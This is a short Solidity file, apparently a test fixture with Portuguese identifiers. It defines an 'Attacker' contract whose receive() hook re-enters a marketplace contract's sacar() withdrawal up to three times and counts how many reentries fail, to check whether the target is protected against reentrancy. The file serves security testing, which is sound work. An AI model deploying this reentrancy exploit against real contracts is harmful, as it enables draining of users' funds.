// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
interface IImporta {
    function sacar(uint256 valor) external;
    function comprar(uint256 itemId) external payable returns (uint256);
    function cancelarPedido(uint256 pedidoId) external;
}
// Contrato malicioso só para testar reentrância em sacar()
contract Attacker {
    IImporta public alvo; uint256 public vezes; uint256 public valor; uint256 public falhasReentrada;
    constructor(address _alvo) { alvo = IImporta(_alvo); }
    function comprarItem(uint256 itemId) external payable returns (uint256) { return alvo.comprar{value: msg.value}(itemId); }
    function cancelar(uint256 pid) external { alvo.cancelarPedido(pid); }
    function atacar(uint256 _valor) external { valor = _valor; alvo.sacar(_valor); }
    receive() external payable {
        if (vezes < 3) { vezes++; try alvo.sacar(valor) {} catch { falhasReentrada++; } }
    }
}
